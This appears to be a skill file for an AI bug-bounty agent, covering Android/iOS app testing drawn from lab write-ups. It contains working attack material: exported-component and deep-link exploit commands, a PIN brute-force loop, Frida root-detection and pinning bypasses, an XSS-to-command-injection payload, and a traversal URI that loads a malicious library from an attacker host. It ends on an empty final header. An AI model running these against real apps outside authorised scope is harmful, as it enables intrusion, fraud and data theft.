---
name: mobile-app-testing
description: Mobile app (Android/iOS) bug bounty testing methodology — static analysis (decompiling APKs, hardcoded secrets, manifest misconfig), dynamic analysis (proxy interception, SSL pinning bypass, runtime manipulation via Frida/Objection), local storage inspection, deep link/intent abuse, and WebView XSS. Use this during Phase 1-3 of bughunting-workflow whenever the target has a mobile app component (an APK/IPA in scope, a program that explicitly includes mobile, or an API that's primarily consumed by a mobile client). Also trigger on mentions of APK, IPA, Frida, jadx, apktool, MobSF, SSL pinning, deep link, intent, Objection, or mobile app pentest.
---

# Mobile App Testing

General technique library for Android/iOS bug bounty testing. Add new dated entries below as more mobile-testing writeups are processed.

## Vulnerability classes this covers

- **Information disclosure**: hardcoded API keys (AWS/Firebase/Stripe), insecure local data storage, debug flags/backup enabled in production builds
- **Network security**: missing certificate pinning (trivial MITM), plaintext HTTP, apps that accept any SSL cert
- **Auth/authz**: insecurely stored tokens, IDOR in API calls, weak/missing rate limiting
- **Client-side**: deep link hijacking, intent manipulation (auth bypass via intents), WebView XSS, root/jailbreak-detection bypass

## Methodology (4 phases)

### Phase A — APK acquisition
Pull the APK off an installed device via ADB, or download from APKMirror/APKPure if you don't have a device with the app installed.

### Phase B — Static analysis (code review, no execution)
- Decompile the APK structure with **APKTool**: `apktool d target.apk -o target_decoded`
- Read the decompiled Java/Kotlin source in **JADX**: `jadx-gui target.apk`
- Read `AndroidManifest.xml` specifically for: requested permissions, `android:exported="true"` components, `android:debuggable="true"`, backup settings (`android:allowBackup`)
- Grep the decompiled source for hardcoded secrets:
  ```
  grep -r "api_key" .
  grep -r "AKIA" .        # AWS access key ID pattern
  grep -r "password" .
  grep -r "token" .
  ```
- Run an automated scan with **MobSF** for a quick baseline report before manual review:
  ```
  docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
  ```

### Phase C — Dynamic analysis (runtime, on emulator/device)
- Install the app, configure an HTTP proxy (Burp Suite on `0.0.0.0:8080`), install Burp's CA cert on the device/emulator, and intercept/modify traffic like any web target.
- On Android 7+ (API 24+), apps trust only the system CA store by default — Burp's user-installed cert alone won't intercept traffic even without explicit SSL pinning (source: [Complete Mobile Hacking Cheatsheet](https://freedium-mirror.cfd/https://medium.com/@saket590/complete-mobile-hacking-cheatsheet-9cad23d18ba1)). If the target isn't rooted (so the cert can't be pushed into the system store) and repackaging is acceptable, patch `res/xml/network_security_config.xml` (create it if absent) to add a `<trust-anchors>` entry for `<certificates src="user"/>` alongside `system`, reference it from `AndroidManifest.xml`'s `<application android:networkSecurityConfig="@xml/network_security_config">`, then rebuild/re-sign/`zipalign` the APK (this skill's existing APK-modification-workflow commands below) — this re-enables the same Settings-installed user CA cert Android trusted by default pre-7.0. Simpler than a root+system-store cert push when repackaging is already on the table for other reasons (e.g. re-signing after smali patches).
- If certificate pinning blocks interception, bypass it (see "SSL pinning bypass" below) before continuing.
- Inspect local data storage (Shared Preferences, SQLite DBs — see commands below) once you have traffic flowing, since local storage and network traffic often reveal the same class of issue (tokens, secrets) from different angles.
- Test deep links and exported components directly via ADB, independent of the app's UI.

### Phase D — Advanced/runtime manipulation
- Use **Frida** for live runtime hooking (bypass SSL pinning or root detection by patching the relevant function's return value in memory, no APK modification needed).
- Alternatively, patch and recompile the APK directly if Frida/root access isn't viable on the target device.
- Extract encryption keys or intercept binary (non-HTTP) protocols if the app uses a custom protocol rather than REST/JSON over HTTPS.

## Tools & commands

**APKTool** — decompile/recompile:
```
apktool d target.apk -o target_decoded
apktool b target_decoded -o modified.apk
```

**JADX** — readable Java/Kotlin source viewer: `jadx-gui target.apk`

**MobSF** — automated scanner, upload APK get a vulnerability report (Docker-based, see above).

**Frida** — runtime instrumentation:
```
pip install frida-tools
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"
frida -U -n com.target.app
```

**Objection** — "Frida in easy mode," a wrapper that ships common bypasses as one-liners:
```
pip install objection
objection -g com.target.app explore
android sslpinning disable
```

**Drozer** — IPC/attack-surface enumeration and exploitation framework (maintained by WithSecure; source: [Drozer: Android Application Penetration Testing](https://freedium-mirror.cfd/https://medium.com/@rockysingh76517/drozer-android-application-penetration-testing-using-the-drozer-fd3a57a7e0b4)), complementary to Frida/Objection — where those instrument a *running process*, Drozer drives the exported-component attack surface (activities/providers/services/receivers) from *outside* the app, the same way another app or `adb` would:
```
# setup: install drozer-agent.apk on device, enable its Embedded Server (port 31415)
adb forward tcp:31415 tcp:31415
drozer console connect

# recon
run app.package.list -f <name_fragment>          # locate the target package
run app.package.info -a <package>                # app details (permissions, UID, etc.)
run app.package.manifest <package>                # read the manifest through the device itself
run app.package.attacksurface <package>           # one-shot summary of every exported component

# content provider enumeration — automates this skill's existing manual adb-query/brute-force technique
run app.provider.info -a <package>                # list exposed providers
run scanner.provider.finduris -a <package>         # brute-force-discover queryable URIs under each provider, including ones not obvious from the manifest alone
run app.provider.query content://<uri> --vertical  # extract and pretty-print provider data
```
`scanner.provider.finduris` is the standout module here — it fuzzes path segments under a discovered provider authority to surface queryable URIs the manifest/static analysis alone wouldn't reveal, before you move to this skill's existing PIN-brute-force/Frida-hook techniques against whichever URI it finds. Install note: Drozer 2.4.4 still requires Python 2.7 on the Kali/attacker side (`pip2.7 install drozer-2.4.4-py2-none-any.whl`) even though the target app and device are unaffected — a legacy-toolchain quirk worth knowing about before troubleshooting a confusing install failure.

## Putting it together — how the exported-component/deep-link entries below chain into one methodology

The "Exported component exploitation" through "Cross-app malicious-HTML delivery" entries just below aren't independent bugs to spot-check one at a time — they're variations on a single recurring attack shape (**exported component → attacker-controlled Intent data → a vulnerable sink reached with the app's own privileges**), and working through them in this order on any new target covers the full surface efficiently:

1. **Enumerate every exported component first, by type.** Pull `AndroidManifest.xml` and list every `<activity>`, `<provider>`, `<service>`, and `<receiver>` with `android:exported="true"` (or no explicit value on a manifest targeting API 30 or below, where unset defaults to exported if an intent-filter is present). Each component type has its own baseline technique: Activities → direct launch via `am start`; Content Providers → the Drozer `scanner.provider.finduris`/SQL-injection-via-query-URI technique below; Broadcast Receivers and Services → direct `am broadcast`/`am startservice` against the component name. Do this full sweep before investing time in any single component.
2. **For each exported Activity, check whether it's a direct target or just a relay.** Most of the time it directly does something with the Intent data it receives (the base case below). But first check for **Intent Redirection** — does the activity pull a *second*, embedded `Intent` out of its own extras and blindly `startActivity()` it? If so, it's a confused-deputy door into the app's normally-unexported activities, and the real vulnerable sink to chase is whatever that *private* activity does with its own extras, not the exported relay itself.
3. **Once you've identified the actual activity that processes attacker data, identify which of the four delivery+sink combinations below applies** by tracing what happens to the Intent's `data`/extras in the decompiled source: does it get used as a file path (→ path-traversal-to-native-library-RCE), parsed as YAML/a structured config (→ unsafe-deserialization RCE), rendered into a WebView (→ XSS, then check for an `addJavascriptInterface()` bridge to escalate to command injection), or does the activity accept a `content://`/`file://` URI it'll load regardless of origin (→ the cross-app FileProvider delivery variant, useful when you can't embed the payload directly in a URI string)? These aren't mutually exclusive — a single target can have more than one exported activity, each vulnerable to a different one of these.
4. **Match the delivery mechanism to what's actually reachable.** A same-device deep link via `adb shell am start` is the cheapest test during manual analysis, but the real-world delivery vector for a live bug bounty finding is usually a second malicious app (for Intent Redirection, Content Provider abuse, and the cross-app FileProvider variant) or a malicious web page the victim visits (for any component with an intent-filter that also handles `http://`/`https://` deep links) — confirm which delivery path is actually realistic for the target's installed base before writing up severity.

**Generalize note:** this same "exported entry point → attacker-controlled data → unsanitized sink" shape recurs across every Android attack-surface category (not just the labs these entries are sourced from) — once a target's exported-component inventory is built in step 1, it becomes the reusable checklist for the rest of a mobile engagement, not a one-time recon pass.

## Specific techniques

**Exported component exploitation** — launch a supposedly-protected activity directly, bypassing the app's normal navigation/auth flow:
```
adb shell am start -n com.target.app/.AdminActivity
```
Check the manifest for `android:exported="true"` on any activity/service/receiver that looks sensitive (admin, settings, payment) — if exported, it's reachable this way regardless of in-app auth checks.

**Intent Redirection** (Source: [Android Hacking: Securing InsecureShop — Intent Redirection](https://freedium-mirror.cfd/https://medium.com/android-appsec-by-safe-to-run/android-hacking-securing-insecure-shop-intent-redirection-f49117f1fc91)) — a distinct escalation beyond directly launching an exported component: an exported activity that pulls a **whole second `Intent` object** out of its own incoming intent's extras (typically via `getParcelableExtra<Intent>("extra_intent")` or similar) and blindly `startActivity()`s it, acting as a confused-deputy relay. Since the *exported* activity is the one making the `startActivity()` call, it runs with the app's own internal permissions — any private, `android:exported="false"` activity it can normally reach becomes reachable by a third-party app that never had direct access to it:
```kotlin
// malicious caller app
Intent("<target's exported intent-filter action>").apply {
    putExtra("extra_intent", Intent().apply {
        setClassName("<target.package>", "<target.package>.PrivateActivity")
        putExtra("url", "https://attacker-controlled.example/")   // or whatever extras PrivateActivity trusts
    })
}
```
Grep decompiled source (jadx) for `getParcelableExtra<Intent>` / `getParcelableExtra(..., Intent::class.java)` followed by a `startActivity()` call with no validation of the extracted intent's target component or action — that pattern is the vulnerable sink regardless of what the embedded intent is eventually used for. Impact depends entirely on what the reached private activity does with its own extras (in the source example, a `PrivateActivity`'s WebView loaded an attacker-supplied `url` extra unsanitized, chaining into phishing/WebView-JS-injection) — treat Intent Redirection as a door-opener into whatever the target's unexported activities expose, the same framing as this skill's exported-Broadcast-Receiver and exported-ContentProvider entries below.

**Exported Broadcast Receiver abuse** (Source: [Android Hacking: Exploiting Broadcast Receiver](https://freedium-mirror.cfd/https://infosecwriteups.com/android-hacking-exploiting-broadcast-receiver-a0bec16ecc08)) — the fourth exported-component type (alongside Activity/Provider/Service): a `<receiver>` with `android:exported="true"` and no `android:permission` attribute accepts a broadcast `Intent` from *any* other app on the device, with no in-app auth or caller-identity check, and executes whatever internal logic it's wired to on receipt. Trigger it directly via `adb` (or, in a real attack, from a malicious installed app calling `sendBroadcast()`):
```bash
adb shell am broadcast -a <action_string> -n <package.name>/<ReceiverClassName> \
  --es <extra_key1> "<value1>" --es <extra_key2> "<value2>"
```
Find the action string and expected `Bundle` extra keys from static analysis (jadx) of the receiver's `onReceive()` method — the exploit is exact-match: wrong action string or missing extras just silently no-ops. In the source example, a receiver meant only for internal same-app SMS confirmation (`SendSMSNowReceiver`, action `..._fourgoats.SOCIAL_SMS`, extras `phoneNumber`/`message`) was reachable by any other app and directly invoked `sendTextMessage()` with attacker-supplied number/content, enabling unauthorized premium-SMS sending/financial fraud with zero user interaction once a malicious app is installed. Check `onReceive()` for *any* sensitive side effect (SMS/call, local file write, broadcasting a further sensitive intent, toggling a security-relevant setting) once an exported receiver is confirmed — the severity is driven entirely by what the receiver does, the same framing as `403-bypass-testing`'s "bypass is a door opener" note for exported components in general.

**Exported Content Provider data extraction/brute-force** (Source: [Secure Notes Lab — Mobile Hacking Lab](https://freedium-mirror.cfd/https://systemweakness.com/secure-notes-lab-mobile-hacking-lab-4ffde3d2955b)) — a `<provider>` tag in the manifest is a distinct exported-component type from activities/services/receivers, built specifically to serve structured data (often backed by SQLite) and directly queryable from any other app or from `adb` with zero in-app auth once `android:exported="true"` and no `android:permission`/signature-level protection is set:
```bash
adb shell content query --uri content://<package.name>.<provider_authority>
```
If the provider exposes a field protected only by a small guessable value (a 4-digit PIN, short code), brute-force it directly through the query interface rather than the app UI — there's typically no rate limiting at the ContentProvider layer:
```bash
for i in {0001..9999}; do
    echo -n "$i "; adb shell content query --uri content://<package.name>.<provider_authority> --where "pin=$i"
done
```
Also pull the provider's authority and any backing encryption/config values from static analysis first (`AndroidManifest.xml` for the authority string, `assets/`-bundled config/properties files for hardcoded keys/IVs/salts) — a provider's own "encryption" is often defeated before you even need the brute-force step if its parameters are bundled in the APK.

**Frida-driven variant** (same Secure Notes lab, source: [Insecure Content Provider in Android — MobileHackingLab Secure Notes Write-up](https://freedium-mirror.cfd/https://ajmalmoochingal.medium.com/insecure-content-provider-in-android-mobilehackinglab-secure-notes-write-up-22c44571442f)): when the provider's query logic does more than a flat `WHERE pin=`-style filter (e.g. it decrypts a stored blob using whatever PIN value is passed, so a wrong guess doesn't error but just returns garbage), hooking `ContentResolver.query()` directly from inside the app's own process via Frida lets you iterate the full keyspace and inspect the actual decrypted result each time, rather than relying on `adb`'s query output alone:
```javascript
const contentUri = 'content://<package.name>.<provider_authority>';
const Uri = Java.use("android.net.Uri");
const DbUtils = Java.use("android.database.DatabaseUtils");
const resolver = Java.use("android.content.Context").getContentResolver();
// iterate pin 0000-9999, building selection string "pin=<n>", call resolver.query(), dump each cursor with DbUtils.dumpCursorToString()
```
```bash
frida -U -f <package.name> -l script.js
```
Functionally the same brute-force as the `adb` loop above, just run from inside the process when you need to observe app-internal decryption behavior per-guess rather than treating the provider as a black box.

**IDOR in mobile API calls** — same concept as web IDOR, tested via the intercepted proxy traffic:
```
GET /api/user/profile?user_id=124   # swap for a user_id that isn't yours
```

**Shared Preferences inspection** — Android apps often stash tokens/flags here:
```
adb shell
run-as com.target.app
cd /data/data/com.target.app/shared_prefs
cat com.target.app_preferences.xml
```

**SQLite database access**:
```
run-as com.target.app
cd /data/data/com.target.app/databases
sqlite3 user.db
SELECT * FROM users;
```

**Deep link testing** — invoke a deep link directly via ADB to test for auth bypass or unintended actions (e.g. a password-reset link that trusts a client-supplied `user_id`):
```
adb shell am start -W -a android.intent.action.VIEW -d "targetapp://reset-password?user_id=123"
```

**Deep-link path traversal → malicious native-library-load RCE** (source: [Mobile Hacking Lab: Document Viewer](https://freedium-mirror.cfd/https://medium.com/@happyjester80/mobile-hacking-lab-document-viewer-1efdf8c729fb)) — a more severe variant of intent-data abuse than the auth-bypass case above, for apps that render a remote-URI-supplied document/file and separately `System.loadLibrary()` a native `.so` from a predictable path under their own app-data directory:
1. Statically review the exported Activity's URI-handling code (jadx) for a pattern like `getIntent().getData()` → `getLastPathSegment()`/raw path concatenation feeding a file-loading or download function without normalizing `../` sequences — this is the same traversal bug class as `path-traversal-testing`, just reached via an Intent URI instead of an HTTP parameter.
2. Identify the device/emulator ABI so the planted library matches what the app will actually try to load: `adb shell getprop ro.product.cpu.abi`.
3. Write a minimal malicious native library in C++ whose `JNI_OnLoad`/an exported native method the app calls on load executes an arbitrary command (e.g. `system("id > /data/data/<pkg>/hacked.txt")`), build it (Android Studio NDK or standalone toolchain), and serve the resulting `.so` on an attacker-controlled HTTP server.
4. Build a URL-encoded path-traversal URI that walks from the HTTP server's root back up to the absolute filesystem path the app expects its native library at (`..%2F` repeated enough times, landing on `/data/data/<pkg>/files/native-libraries/<ABI>/<expected-lib-name>.so`), so the traversal download write lands the attacker's `.so` exactly where the app's own loader will find and execute it next launch/use.

**Deep-link-delivered unsafe YAML deserialization → RCE** (sibling lab in the same series, source: [Mobile Hacking Lab: Config Editor](https://freedium-mirror.cfd/https://medium.com/@happyjester80/mobile-hacking-lab-config-editor-76e3e3cd2943)) — full exploit (SnakeYAML CVE-2022-1471, `!!javax.script.ScriptEngineManager`/`URLClassLoader` gadget chain, exact ADB deep-link trigger command) recorded in `rce-exploitation-testing` entry #4 rather than duplicated here, since the deserialization mechanics are the same regardless of delivery channel — this skill owns "deep link as the delivery vector," that skill owns "what the unsafe deserializer does once it fires." Same source also independently confirms the `getLastPathSegment()` traversal bug already noted above as a reachable-via-Uri-API pattern.
5. Deliver the crafted URI via an explicit Intent to the vulnerable exported Activity (`Intent.ACTION_VIEW` + `setComponent(<package>, <Activity>)` + `setData(<malicious-uri>)`), triggering the download-to-predictable-path write; the next time the app invokes the native function, the attacker's code runs with the app's own process privileges.

**Root cause:** two separate missing-validation bugs chained together — the URI/file-fetching code never canonicalizes the resulting path against the intended base directory (classic traversal), and the native-library-loading code trusts whatever file currently sits at its expected path rather than verifying its integrity (checksum/signature) before loading it.

**Precise mechanism of the traversal bypass** (independent writeup of the same lab, source: [Path Traversal to RCE in Android — Mobile Hacking Lab: Document Viewer Write-Up](https://freedium-mirror.cfd/https://ajmalmoochingal.medium.com/path-traversal-to-rce-in-android-mobile-hacking-lab-document-viewer-write-up-ef9226aea1ac)): `Uri.getLastPathSegment()` *does* URL-decode its result, but it parses the path into segments *before* decoding — so a literal, unencoded `/` genuinely splits the path, while a `%2f`-encoded slash survives segment-splitting intact and only becomes a real `/` afterward, when the already-"safe" decoded segment is handed to `new File(...)`, which happily honors the now-revealed `../` traversal. This is the specific encode/decode-order confusion worth checking for in any Android code calling `getLastPathSegment()` on an attacker-controlled URI, not just in this lab. Confirmed working payload shape: `http://<attacker-ip>/..%2f..%2f..%2f..%2f..%2fdata%2fuser%2f0%2f<pkg>%2ffiles%2fnative-libraries%2f<abi>%2f<expected-lib-name>.so`. This source's native-library payload uses `fork()` before `system()` inside `JNI_OnLoad` (rather than calling `system()` directly) — worth doing the same, since `JNI_OnLoad` runs synchronously during library load and a blocking/misbehaving call there can crash or hang the loading app.

**Real-world execution-context caveat:** this source also notes the achieved RCE ran under the app's own restricted uid (`10072`-style per-app sandbox) and outbound network connections from that context were blocked by platform-level restrictions — don't assume "got RCE" automatically means "got a reverse shell out"; test the actual egress capability of the compromised app's sandbox separately before promising exfiltration/C2 as part of the impact claim.

**Impact:** full arbitrary code execution inside the app's process/sandbox — read/write anywhere in the app's data directory, execute system commands, not just a data leak. Report as RCE, not as a bare path-traversal/arbitrary-file-write — the native-library-load step is what elevates severity from "wrote a file" to "ran code."

**Deep-link → WebView XSS → JavaScript-bridge command injection → RCE** (sibling lab in the same series, source: [XSS & Command Injection in Android — MobileHackingLab "Post Board" Write-Up](https://freedium-mirror.cfd/https://ajmalmoochingal.medium.com/xss-command-injection-in-android-mobilehackinglab-post-board-write-up-ae9497829615)) — a third deep-link delivery chain, this time ending in `Runtime.getRuntime().exec()` rather than a deserializer or native-library load:
1. Statically review the exported Activity handling the custom URI scheme (e.g. `postboard://postmessage/<base64>`) — confirm it base64-decodes the path segment and feeds it straight into a WebView's `loadData`/`loadDataWithBaseURL` without HTML-encoding, the same unsanitized-sink pattern as any other WebView XSS, just reached via Intent data instead of an HTTP parameter.
2. Confirm basic script execution first with a minimal payload: `hello<img src=x onerror=alert(1)>`.
3. Check `addJavascriptInterface()` calls (jadx) for any object exposed to the WebView's JS context (e.g. `WebAppInterface`) — every public method on that object is callable directly from injected JavaScript once step 2 confirms script execution.
4. Enumerate the bridge's methods for one that shells out — grep decompiled source for `Runtime.getRuntime().exec(` with string concatenation of a bridge parameter (here, `postCowsayMessage(msg)` → `runCowsay()` → `exec(new String[]{"/bin/sh","-c","cowsay " + msg})`). This is the same unsanitized-shell-concatenation root cause as any other command injection (`rce-exploitation-testing`), just reached through a JS bridge instead of an HTTP form field.
5. Confirm command injection by calling the bridge method from the XSS payload with a shell metacharacter appended: `hello<img src=x onerror=window.WebAppInterface.postCowsayMessage('abc;id')>`.
6. Weaponize into a single clickless delivery: base64-encode the full payload (`echo "...payload..." | base64 -w 0`) and deliver via the custom URI scheme with no app UI interaction at all:
```bash
adb shell am start -a android.intent.action.VIEW \
  -d "postboard://postmessage/$(echo 'hi<img src=x onerror=window.WebAppInterface.postCowsayMessage(\"msg;id;\")>' | base64 -w 0)"
```
**Root cause:** two stacked bugs, same shape as the Document Viewer/Config Editor chains above — an exported component accepts attacker-controlled data via Intent URI with no origin/signature check on the caller, and that data reaches first an unsanitized WebView render (XSS) and then, via the JS bridge, an unsanitized shell `exec()` call (command injection) — WebView XSS alone would just be a sandboxed-webpage bug; the bridge is what turns it into native-process RCE.

**Impact:** a malicious app with no special permissions can trigger this purely via `am start`/an Intent, with no victim interaction beyond having the vulnerable app installed — full command execution with the target app's own privileges. Report as RCE (chain: Intent-based XSS → JS-bridge command injection), not as a standalone WebView XSS.

**Generalize:** any `addJavascriptInterface()`-exposed object is a privilege boundary — audit every public method on it for unsanitized use in `exec()`, file I/O, or further intent dispatch, the same way you'd audit a REST endpoint's parameters; if the JS bridge is reachable from WebView content the app doesn't fully control (a deep link, a loaded remote page, injected HTML), treat the bridge itself as directly attacker-reachable, not just the WebView's rendering.

**Cross-app malicious-HTML delivery via FileProvider `content://` URI into an exported WebView activity** (source: [Android Hacking: Securing Insecure Shop — Unprotected Data URIs](https://freedium-mirror.cfd/https://danielllewellyn.medium.com/android-hacking-securing-insecure-shop-unprotected-data-uris-a177d9750d64)) — a fourth delivery mechanism for the same family of bugs above, distinct from a deep-link-embedded payload: here the malicious *content itself* lives in the attacker's own app, not encoded into the URI.
1. Confirm the target exposes an exported activity (e.g. `WebView2Activity`, `android:exported="true"` with an intent filter) whose WebView is configured with `javaScriptEnabled = true` **and** `allowUniversalAccessFromFileURLs = true` — the second setting is what makes this chain work, since it lets content loaded via a `file://`/`content://`-backed URI access other local file-scheme resources and execute with elevated same-origin privileges rather than being sandboxed to its own origin.
2. Check what the activity actually trusts as its URL source — this source's target accepted a URL from three separate places (raw intent `data`, a query parameter, and a `Bundle` extra), any one of which is a viable injection point; audit all of them, not just the first one found.
3. From a separate, attacker-controlled app, package malicious HTML/JS as a bundled resource (e.g. `res/raw/hacked.html`), register a `FileProvider` in that attacker app's own manifest with permissions over its cache directory, then at runtime copy the resource into the cache dir and obtain a `content://` URI for it via `FileProvider.getUriForFile(...)`.
4. Launch the vulnerable app's exported activity with that URI as the intent data, granting read permission explicitly so the receiving app can actually load it across the app-sandbox boundary:
```kotlin
Intent("com.insecureshop.action.WEBVIEW").apply {
    data = maliciousContentUri
    flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
}
```
5. The vulnerable app's WebView loads and executes the attacker-controlled HTML/JS directly out of the attacker app's FileProvider-exposed cache file — no network server, no deep-link URI-encoding tricks, just a second malicious app and an explicit permission grant.

**Root cause:** same family as the other WebView-delivery entries above — an exported component with no caller-origin/signature check — but the specific enabling factor here is `allowUniversalAccessFromFileURLs`, a WebView setting that's easy to miss in a manifest/code review since it doesn't look as obviously dangerous as `javaScriptEnabled` alone.

**Impact:** arbitrary HTML/JS execution in the victim app's WebView context from any other installed app (even one with no special permissions beyond declaring its own FileProvider) — credential/session theft from whatever the WebView has access to, phishing overlays, or further chaining through any exposed JS bridge exactly as in the Post Board entry above.

**Remediation worth citing when reporting/retesting a fix:** host/origin allowlisting before any URL load (the source references a `SafeToRun` library's `urlVerification()` helper enforcing a single trusted host) and disabling `allowUniversalAccessFromFileURLs` unless the app genuinely needs cross-file-scheme access — the latter is a one-line config change that closes this entire delivery vector regardless of how many intent-data sources feed the WebView.

**SSL pinning bypass (Objection)** — fastest path, no Frida scripting needed:
```
objection -g com.target.app explore
android sslpinning disable
```

**Root detection bypass (Frida script)** — patch the detection function to always return "not rooted":
```javascript
Java.perform(function() {
    var RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");
    RootBeer.isRooted.implementation = function() {
        return false;
    };
});
```

**APK recompile + resign** (for patching client-side logic directly, e.g. removing a premium-feature check):
```
apktool b target_decoded -o modified.apk
zipalign -fv 4 modified.apk aligned.apk   # must run BEFORE signing, not after — a post-sign zipalign invalidates the signature
keytool -genkey -v -keystore my-key.keystore -alias my-key -keyalg RSA
jarsigner -verbose -sigalg SHA1withRSA aligned.apk my-key   # v1-scheme only; use apksigner instead for v2-v4 (required on API 30+/newer devices)
# apksigner sign --ks my-key.keystore aligned.apk
adb install aligned.apk
```

## Common vulnerable patterns to grep/spot in decompiled source

- **Debuggable production build**: `<application android:debuggable="true">` in the manifest — allows full runtime inspection/manipulation that shouldn't be possible on a release build.
- **Exported sensitive component**: `<activity android:name=".AdminActivity" android:exported="true">` — directly launchable, bypassing intended navigation/auth.
- **World-readable insecure storage**:
  ```java
  SharedPreferences prefs = context.getSharedPreferences("user_data", MODE_WORLD_READABLE);
  prefs.edit().putString("password", userPassword).commit();
  ```
- **Fake "encryption"**: `Base64.encode(userPassword)` — Base64 is encoding, not encryption; treat any Base64-only "protection" of sensitive data as a finding.
- **Predictable/non-expiring tokens**: sessions or tokens that never expire or follow a guessable pattern.
- **Debug TODO comments left in from development**: `// TODO: remove this before release String adminKey = "..."` — developers routinely leave exactly the comment that flags where they cut a corner; grep source comments for `TODO`/`FIXME`/`XXX`/`remove before release` alongside the usual secret-keyword sweep, not just the code itself.
- **Dangerous permissions in the manifest worth flagging even without a concrete exploit yet**: `INTERNET`, `READ_SMS` (2FA-code interception target), `SYSTEM_ALERT_WINDOW` (overlay/tapjacking primitive) — cross-check the full permission list against what the app's actual advertised functionality needs; an unexplained dangerous permission is worth asking "why does this app need this" before moving on.

## Recorded technique: hidden/undocumented API-endpoint hunting via fast strings-grep + jadx CLI
Source: [APK Goldmine: How Reverse Engineering Reveals Hidden APIs](https://systemweakness.com/apk-goldmine-how-reverse-engineering-reveals-hidden-apis-11401562d3d0)

**Where:** any target with a mobile app client — the app's own binary is a direct source of the *backend's* full API surface, including endpoints the web app/public docs never reference at all, since mobile clients frequently ship ahead of (or with extra debug/beta functionality beyond) the public web UI.

**Root cause:** base URLs, full endpoint paths, and sometimes literal API keys/tokens end up as plain string constants in compiled app code — Java/Kotlin (and Dart/ObjC/Swift equivalently) doesn't obfuscate string literals by default, so anything the developer typed as a URL or path string is sitting in the binary exactly as written, regardless of whether that endpoint is ever referenced in the public-facing web app.

**Exploit steps — a fast first-pass alternative/complement to full `jadx-gui` browsing:**
```bash
# Fastest possible pass — raw string extraction, no decompilation at all
strings app.apk | grep "http"

# CLI decompile to a directory (vs. jadx-gui's interactive browser) — enables scripted grepping across the whole output tree
jadx -d out app.apk
grep -rE 'https?://[a-zA-Z0-9.-]+/[a-zA-Z0-9/_-]*' out/ --include=*.java
```
1. Run the `strings`-based pass first — it's nearly instant and needs no decompilation step, making it worth running on every APK as a baseline even before deciding whether full static analysis is warranted.
2. Grep specifically for base-URL patterns (`"https://api.company.com/v1/private"` style) and for path fragments that look internal/undocumented: `/user/resetPassword`, `/admin/debug`, `/betaFeatures` — any path segment containing `admin`, `debug`, `internal`, `beta`, `test`, or `staging` is a priority follow-up over an ordinary-looking `/user/profile`-style path.
3. Cross-reference every extracted endpoint against the target's public API documentation/web app traffic — anything present in the APK but absent from the documented surface is by definition untested by whoever wrote the docs, and is exactly the kind of endpoint that gets shipped with weaker authorization checks than the primary, heavily-reviewed ones.
4. Follow up on any extracted endpoint the same way as any other API endpoint recon finding — proxy a request to it, test for missing auth, and treat it as a fresh IDOR/BOLA candidate (this skill's existing mobile-API-IDOR technique above) rather than assuming mobile-exclusive endpoints got the same scrutiny as the web ones.

**Impact data points from the source (concrete examples worth citing when framing severity):** extracted Firebase Realtime DB URLs from app strings leading to "millions of user records" once tested for public read/write (cross-reference `vibe-coded-app-testing`'s Firebase-misconfiguration technique for the exact exploitation steps once a Firebase URL is found this way); hardcoded *test/staging* API keys found in a production app build that still worked against staging infrastructure, enabling a staging-environment pivot; hidden admin endpoints discovered purely through string extraction, reachable with no additional auth.

**Generalize note:** this is the mobile-specific instance of the same "endpoints referenced in client-side code but never linked from the UI" pattern `recon-scanning-toolkit`'s JS-file analysis section covers for web targets — the APK's compiled strings are simply a different client artifact carrying the same category of leak. Run both passes (JS analysis for the web client, this strings/jadx pass for the mobile client) whenever a target ships both, since developers who scrubbed secrets from one client's code frequently forget to do the same for the other.

## Recorded technique: iOS `.ipa` extraction + systematic extract→grep→curl secret-validation pipeline
Source: [Extract-Grep-Curl: A $50,000 Bug POC Methodology](https://infosecwriteups.com/extract-grep-curl-a-50000-bug-poc-methodology-16365489de92)

**Where:** any iOS app in scope — `.ipa` files are trivially unpackable (they're just ZIP archives), no jailbreak or Objective-C/Swift decompiler needed for a pure string/config-file secret hunt.

**Exploit steps:**
```bash
unzip app.ipa -d ios-out
# Examine the app's Info.plist for config values, and each embedded framework binary for string-literal secrets:
strings ios-out/Payload/*.app/Frameworks/FrameworkName | grep -iE "secret|token|key|api"
```
This is the direct iOS equivalent of the Android `strings app.apk | grep "http"` fast-pass in this skill's existing entry above — same "compiled string literals leak plaintext regardless of platform" root cause, just a different archive format and binary layout to unpack first.

**The general three-phase pipeline this source frames all client-app secret hunting around (Extract → Grep → Curl), worth applying to any client artifact, not just iOS:**
1. **Extract** — unpack the platform-specific container into plain files: `.ipa` via `unzip` (iOS, as above), `.apk` via `apktool d` (Android, this skill's existing coverage), or the desktop-client equivalents in `desktop-client-secret-extraction-testing` for Electron `.asar` bundles and Windows installers.
2. **Grep** — a single broad regex sweep across every extracted config/source file for the full secret-shape taxonomy in one pass:
   ```bash
   grep -rE --include=*.{env,json,js,xml,plist} \
     'ghp_|AKIA|sk_live|eyJ|client_secret|api_key|token' \
     ./extracted-files
   ```
   Cross-reference `github-recon-testing`'s per-provider secret-regex catalog for the fuller pattern list (Stripe, Slack, Firebase, JWT, etc.) this grep is a compact subset of.
3. **Curl** — never report a found-looking string as a finding on its own; validate it live and, critically, check what it's actually *authorized to do* (read-only vs. write access), since permission scope is what turns "found a token" into a fundable bug — see this skill's `github-recon-testing` cross-reference below for the concrete GitHub-token validation chain this source's $50,000 finding used.

**Impact:** the source's own headline example — a GitHub personal access token (`ghp_...`) found via this pipeline inside a client application, validated with escalating specificity (identity → org membership → repo push permission) until `push: true` confirmed write access to a real repository — earned **$50,000** on HackerOne. The severity jump from "found a token" to "$50,000 bug" was entirely the validation step proving write access, not the discovery step.

**Generalize note:** cross-reference `github-recon-testing`'s Key validation section for the full escalating-curl-chain example (identity → org → repo-permission) added there from this same source, and `desktop-client-secret-extraction-testing` for the Electron/Windows-desktop extraction techniques this source covers that fall outside mobile scope.

## Recorded technique: Frida-hooking the PIN/credential function pre-hash, combined with small-keyspace brute force and no server-side rate limiting ($5,000 banking app)
Source: [Day 8 — Mobile Hacking: How I Cracked a Banking App's PIN in 10 Seconds ($5,000 Bug)](https://freedium-mirror.cfd/https://infosecwriteups.com/day-8-mobile-hacking-how-i-cracked-a-banking-apps-pin-in-10-seconds-5000-bug-575bd10823cd)

